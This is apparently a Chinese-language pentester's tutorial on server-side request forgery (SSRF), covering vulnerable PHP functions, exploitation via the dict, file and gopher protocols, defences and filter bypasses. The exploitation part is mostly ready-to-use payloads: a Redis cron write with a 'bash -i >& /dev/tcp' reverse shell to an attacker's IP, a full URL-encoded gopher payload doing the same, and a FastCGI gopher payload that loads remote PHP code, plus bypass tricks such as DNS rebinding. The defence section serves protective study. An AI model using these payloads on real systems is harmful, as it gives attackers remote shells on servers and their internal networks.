# 大话SSRf



漏洞成因？

- fsockopen()
- curl_exec()
- file_get_contents()





漏洞利用?

利用不同的协议，低可信息探测，高可反弹shell

- dict:// 协议 可以通过这个协议来进行一个端口的探测，泄露软件版本信息

  - http://xxx.com?url=127.0.0.1:3306/info
  - 

- file:// 协议 任意文件的读取

  - 如果页面不回显那么这个协议就鸡肋了
  - dict协议有一个功能：dict://serverip:port/name:data 向服务器的端口请求 name  data，并在末尾自动补上rn(CRLF)。也就是如果我们发出dict://serverip:port/config:set:dir:/var/spool/cron/的请求，redis就执行了config set dir /var/spool/cron/ rn.用这种方式可以一步步执行redis  getshell的exp，执行完就能达到和gopher一样的效果。原理一样，但是gopher只需要一个url请求即可，dict需要步步构造。 
  - ‘[SSRF](http://www.91ri.org/17111.html) 

- gopher:// 万金油协议 可模拟GET 或者 **<u>POST</u>**

  - gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议。 

  - redis 任意文件写入从而 反弹shell（GET）:

    - 首先在端口探测的时候要是我们能够探测到6379端口存在，那么可以尝试redis的反弹shell

      因为redis的默认端口就是6379。其次，redis的可以通过传入%0a%0d来注入换行符，从而造成命令的分行

      探测到redis端口后，需要把弹shell的脚本写入 /etc/crontab 自启动项中

      ```
      set 1 "\n\n\n\n* * * * root bash -i >& /dev/tcp/xx.xx.xx.xx[这里是你自己的公网IP]/8888[这里是你监听的端口] 0>&1\n\n\n\n" config set dir /etc/config set dbfilename crontab save 
      ```

  - redis 反弹shell (POST):

    - 首先要获取bash脚本对redis发出的访问请求，要用socat进行端口转发，转发命令为： 

      ` socat -v tcp-listen:4444,fork tcp-connect:localhost:6379 ` 

    - 改成适配gopher协议的url： 

      ```
      gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$56%0d%0a%0d%0a%0a%0
      a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 
      0&gt;&amp;1%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0ad
      ir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$
      10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aq
      uit%0d%0a
      ```

    - 再次urlencode

      ```
      gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d
      %250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20
      bash%20-
      i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F2333%200%3E%261%250a%250a%250a%250d%250a%250d
      %250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250
      a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250
      d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilen
      ame%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2
      A1%250d%250a%244%250d%250aquit%250d%250a
      ```

    - 执行即可在/var/spool/cron/下生成一个名为root的定时任务，任务为反弹shell 

- 利用gopher协议对FastCGI 进行攻击

  在真实世界中，只要发现对方的 PHP FastCGI 是可以外连的话那就可以拿 shell
  所以使用 gopher 构造 FastCGI Protocol 访问本机的 9001 port 就可以任意代码执行

  ```
  Location: gopher://127.0.0.1:9001/x%01%01i%13%00%08%00%00%00%01%00%00%00%00%00%00%01%04i%13%00%8B%00%00%0E%03REQUEST_METHODGET%0F%0FSCRIPT_FILENAME/_www/index.php%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%09%26PHP_VALUEauto_prepend_file%20%3D%20http%3A//orange.tw/x%01%04i%13%00%00%00%00%01%05i%13%00%00%00%00
  
  (使用 PHP_ADMIN_VALUE 把 allow_url_include 设成 on 以及新增 auto_prepend_file 到自己的网站)
  
  ```

  

- Gopher 可以模仿 POST 请求，故探测内网的时候不仅可以利用 GET 形式的 PoC（经典的 Struts2），还可以使用 POST 形式的 PoC。 



除了上面协议的利用还还有：

对内网web应用进行指纹识别，通过访问默认文件实现; 

攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）; 

## SSRF的防御？

防御分两种：

1.打断从内到外的：

 -  对请求进行一个过滤，意味着如果服务端请求的是一个图片但是返回来一个html页面就选择不接受并且做记录
-  统一错误信息，避免进行信息探测
-  禁止30X跳转可以方式dict协议攻击redis

2.打断从外到内

 - 最常用的输入过滤

 - 只允许HTTP或者HTTPS协议，避免了其他协议的骚姿势利用

 - 限制URL白名单或者限制ip

   

### SSRF 一些绕过

- 127.0.0.1 可以转换为 `localhost` 

- Ip地址转换为短地址，网上自行搜索

- ip地址转化为八进制，十进制，十六进制的地址格式或者是整数格式

- 利用@符号来让服务器错误的解析

  - 例如www.baidu.com@192.168.1.1 会让后端以为访问的是www.baidu.com 实际访问192.168.1.1

- 利用服务器解析问题

  - 例如指向任意IP的域名
  - xip.io  10.0.0.1.xip.io   resolves to   10.0.0.1  
  - [www.10.0.0.1.xip.io](http://www.10.0.0.1.xip.io)   resolves to   10.0.0.1  
  - mysite.10.0.0.1.xip.io   resolves to   10.0.0.1  
  - foo.bar.10.0.0.1.xip.io   resolves to   10.0.0.1

- 使用跳转到ipv6地址

- **302 redirect 去绕过限制**

- **利用Enclosed alphanumerics** 

- 利用句号代替 .

- DNS重绑定

  - ```
        (1)、服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP
    
        (2)、对于获得的IP进行判断，发现为非黑名单IP，则通过验证
    
        (3)、服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。
    
        (4)、由于已经绕过验证，所以服务器端返回访问内网资源的结果。
    
    ```

  - 服务器获得参数解析发现参数正常，（我们限制了只允许外网）然后正常访问我们自己的IP

  - 访问后发现TTL=0(生存时间) 于是再次DNS解析，这次解析我们返回的确实内网地址

  - 因为验证已经通过了，所以服务端还是会访问内网的地址

